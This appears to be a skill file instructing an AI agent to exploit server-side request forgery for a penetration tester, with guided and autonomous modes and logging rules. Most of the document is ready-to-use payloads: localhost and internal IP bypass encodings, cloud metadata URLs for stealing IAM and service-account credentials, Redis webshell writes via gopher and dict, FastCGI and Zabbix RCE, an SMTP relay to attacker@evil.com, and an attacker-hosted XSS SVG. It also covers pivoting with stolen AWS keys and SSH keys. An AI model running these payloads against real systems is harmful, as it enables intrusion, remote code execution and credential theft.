# Server-Side Request Forgery (SSRF)

You are helping a penetration tester exploit server-side request forgery. The
target application accepts a URL or hostname from user input and makes a
server-side HTTP request to it. The goal is to access internal services, cloud
metadata, local files, or pivot to RCE via internal service exploitation. All
testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Execute end-to-end. Test bypass techniques, enumerate cloud
  metadata, attempt internal service exploitation. Report at milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (test confirmed,
  internal access achieved, cloud credentials extracted, pivot to another skill):
  `### [YYYY-MM-DD HH:MM:SS] ssrf → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `ssrf-aws-credentials.json`, `ssrf-internal-scan.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[ssrf] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] ssrf → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- Identified parameter that triggers server-side HTTP requests (URL, webhook,
  import, proxy, PDF generator, image fetcher, etc.)
- OOB callback infrastructure for blind SSRF (Burp Collaborator, interactsh, or
  custom server)
- If the response is fully reflected, start with basic SSRF. If only status
  codes or timing differences are visible, use blind techniques.

## Step 1: Assess

If not already provided, determine:
1. **Injection point** — which parameter accepts a URL? (url=, src=, href=,
   redirect=, callback=, webhook=, proxy=, imageUrl=, file=)
2. **Response type** — full response returned? Status only? Blind?
3. **Protocol support** — does it accept only http(s), or also file://, gopher://, dict://?
4. **Filters** — is localhost blocked? Are internal IPs blocked? Allowlist?

Skip if context was already provided.

## Step 2: Basic SSRF

### Localhost Access

```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:443
```

### Internal Network Scanning

```
http://10.0.0.1
http://172.16.0.1
http://192.168.1.1
http://192.168.0.1:8080
```

Scan common internal ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL),
5432 (PostgreSQL), 6379 (Redis), 8080 (alt HTTP), 8443 (alt HTTPS), 9200
(Elasticsearch), 27017 (MongoDB).

### File Read (file:// protocol)

```
file:///etc/passwd
file:///etc/hostname
file:///proc/self/environ
file:///proc/self/cmdline
file://\/\/etc/passwd
```

## Step 3: Filter Bypass

### IPv6 Notation

```
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### Domain Redirects to Localhost

| Domain | Resolves To |
|---|---|
| `localtest.me` | `::1` |
| `localh.st` | `127.0.0.1` |
| `127.0.0.1.nip.io` | `127.0.0.1` |
| `spoofed.redacted.oastify.com` | `127.0.0.1` |
| `ip6-localhost` | `::1` (Linux) |

### CIDR Range (127.0.0.0/8)

```
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### Short-Hand IP

```
http://0/
http://127.1
http://127.0.1
```

### IP Encoding

**Decimal:**
```
http://2130706433/        = 127.0.0.1
http://2852039166/        = 169.254.169.254
```

**Hex:**
```
http://0x7f000001         = 127.0.0.1
http://0xa9fea9fe         = 169.254.169.254
```

**Octal:**
```
http://0177.0.0.1/        = 127.0.0.1
http://0251.0376.0251.0376 = 169.254.169.254
```

**Mixed encoding:**
```
http://0251.254.169.254   = 169.254.169.254 (octal + decimal)
```

### URL Encoding

```
http://127.0.0.1/%61dmin       (single encode)
http://127.0.0.1/%2561dmin     (double encode)
```

### URL Parsing Discrepancy

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

Different parsers resolve `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` differently:
urllib2 → 1.1.1.1, requests → 2.2.2.2, urllib → 3.3.3.3.

### HTTP Redirect Bypass

When the app validates the initial URL but follows redirects:

```
# Using r3dir.me (no server needed)
https://307.r3dir.me/--to/?url=http://localhost
https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/
```

Or host your own redirector:
```php
<?php header('Location: http://169.254.169.254/latest/meta-data/'); ?>
```

Use HTTP 307/308 to preserve the original HTTP method and body.

### DNS Rebinding

Make a domain alternate between two IPs:
```
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

First resolution → 1.2.3.4 (passes allowlist), second → 169.254.169.254
(hits metadata).

### PHP filter_var() Bypass

```
http://test???test.com
0://evil.com:80;http://google.com:80/
```

### JAR Scheme (Java — blind)

```
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
```

### Enclosed Alphanumeric / Unicode

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
```

## Step 4: Cloud Metadata Exploitation

### AWS (IMDSv1 — no headers needed)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

**IMDSv2** (requires PUT to get token first — harder via SSRF):
```bash
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

IMDSv2 can sometimes be bypassed via gopher:// to craft the PUT request.

**AWS ECS** (container credentials):
```
# Extract UUID from /proc/self/environ first
http://169.254.170.2/v2/credentials/<UUID>
```

**AWS Lambda:**
```
http://localhost:9001/2018-06-01/runtime/invocation/next
```

### Google Cloud (requires Metadata-Flavor: Google header)

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env?alt=json
```

**Beta endpoint (no header required):**
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

**Via gopher (to set required header):**
```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

### Azure (requires Metadata: true header)

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Other Cloud Providers

| Provider | Metadata URL |
|---|---|
| Digital Ocean | `http://169.254.169.254/metadata/v1.json` |
| Oracle Cloud | `http://192.0.0.192/latest/meta-data/` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` |
| Hetzner | `http://169.254.169.254/hetzner/v1/metadata` |

### Kubernetes / Docker

```
# Kubernetes ETCD
http://127.0.0.1:2379/v2/keys/?recursive=true

# Docker API
http://127.0.0.1:2375/v1.24/containers/json

# Rancher
http://rancher-metadata/latest/
```

## Step 5: Protocol Exploitation

### gopher:// — TCP Protocol Interaction

Gopher can send arbitrary data to any TCP port. Use Gopherus to generate
payloads:

```bash
# Redis webshell
python2.7 gopherus.py --exploit redis

# MySQL query (passwordless user)
python2.7 gopherus.py --exploit mysql

# FastCGI RCE
python2.7 gopherus.py --exploit fastcgi

# Memcached deserialization
python2.7 gopherus.py --exploit pymemcache
```

### Redis via SSRF (webshell)

**Via dict://**:
```
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20shell.php
dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
dict://127.0.0.1:6379/SAVE
```

**Via gopher://**:
```
gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
gopher://127.0.0.1:6379/_config%20set%20dbfilename%20shell.php
gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%3F%3E%22
gopher://127.0.0.1:6379/_save
```

### FastCGI RCE (via gopher)

Requires knowing a PHP file path on disk (default: `/usr/share/php/PEAR.php`):
```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00...
```

Use Gopherus to generate the full payload.

### SMTP Relay (via gopher)

```
gopher://localhost:25/_MAIL%20FROM:<attacker@evil.com>%0D%0ARCPT%20TO:<victim@target.com>%0D%0ADATA%0D%0ASubject:%20SSRF%20Test%0D%0A%0D%0AMessage%20body%0D%0A.%0D%0A
```

### Zabbix Agent RCE

If `EnableRemoteCommands=1`:
```
gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D
```

## Step 6: Blind SSRF

When the response is not returned to you.

### Detection

```bash
# OOB callback (Burp Collaborator / interactsh)
http://COLLABORATOR.oastify.com
http://ATTACKER.interactsh.com

# Time-based (compare response time for open vs closed ports)
http://127.0.0.1:22    # SSH — fast connect
http://127.0.0.1:1234  # closed — timeout
```

### Blind SSRF Chains

Exploit internal services that accept HTTP and perform actions:

| Service | Exploit |
|---|---|
| Elasticsearch | `http://127.0.0.1:9200/_shutdown` |
| Jenkins | `http://127.0.0.1:8080/script` |
| Docker | `http://127.0.0.1:2375/containers/json` |
| Redis (via HTTP) | Write webshell via CONFIG SET |
| Consul | `http://127.0.0.1:8500/v1/agent/self` |
| Solr | `http://127.0.0.1:8983/solr/admin/cores` |

Full list: [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)

### Upgrade Blind SSRF to XSS

If the SSRF fetches and renders content:
```
http://attacker.com/xss.svg
```

Where `xss.svg` contains:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

## Step 7: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

- **Got AWS credentials**: Use `aws configure` with the extracted
  AccessKeyId/SecretAccessKey/Token to access S3, EC2, IAM
- **Got internal service access**: Check for unauthenticated admin panels,
  databases, Redis, Elasticsearch
- **Redis accessible**: Write webshell via CONFIG SET → RCE
- **FastCGI accessible**: RCE via gopher payload
- **Kubernetes ETCD accessible**: Extract secrets, service account tokens
- **Docker API accessible**: Container escape, host filesystem access
- **Internal web app found**: Test for additional vulns — route to
  **web-discovery**
- **File read only (file://)**: Extract credentials from config files, SSH keys
  from `/home/*/.ssh/`, cloud credentials from `~/.aws/credentials`
- **Found SQLi on internal service**: Route to **sql-injection-error** or
  **sql-injection-union**

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: SSRF endpoint, protocols supported, bypass technique
used, what's accessible internally, current mode.

## Stall Detection

If you have spent **5 or more tool-calling rounds** troubleshooting the same
failure with no meaningful progress — same error, no new information gained,
no change in output — **stop**.

Retrying a command with adjusted syntax, different flags, or additional context
counts as progress. Stalling means repeating the same approach and getting the
same result.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing changes the outcome after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)
- Update `engagement/state.md` Blocked section before returning

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Update state.md Blocked section, return findings to the
  orchestrator. Do not retry the same technique — the orchestrator will
  decide whether to revisit with new context or route elsewhere.

## OPSEC Notes

- SSRF requests originate from the server — appear in the target's outbound logs
- Cloud metadata access may trigger CloudTrail events (AWS) or audit logs
- gopher:// and dict:// protocol abuse may be detected by IDS/IPS
- Redis CONFIG SET and webshell creation leave artifacts
- DNS rebinding generates unusual DNS patterns
- Blind SSRF with OOB callbacks reveal your attacker IP

## Troubleshooting

### No Response from Internal Services

- The app may strip non-http protocols — try `http://` only with internal IPs
- The app may block private IPs — use bypass techniques (DNS rebinding, redirect,
  encoded IPs)
- HTTP redirect may not be followed — try 301, 302, 307, 308
- Response may be filtered — check if error messages leak information

### Cloud Metadata Blocked

- Try IP encoding (decimal, hex, octal, IPv6-mapped)
- Try DNS resolution: `169.254.169.254.nip.io`
- Try HTTP redirect via your server or r3dir.me
- Try DNS rebinding: `make-YOUR.IP-rebind-169.254-169.254-rr.1u.ms`
- For GCP/Azure (header required), use gopher:// to set the header

### IMDSv2 Blocking Access

- IMDSv2 requires a PUT request with token header — cannot be done with simple
  GET SSRF
- Check if the app follows redirects (redirect from your server can set headers)
- Try gopher:// to craft the full PUT request
- Check if IMDSv1 is still enabled alongside v2
- Check ECS credential endpoint (169.254.170.2) which may not require tokens

### gopher:// Not Supported

- Try dict:// for Redis (limited but works for simple commands)
- Try file:// for local file read
- Use HTTP-based exploitation paths (blind SSRF chains via internal HTTP services)
- Try netdoc:// (Java environments)

### Automated Tools

```bash
# SSRFmap — automatic SSRF exploitation
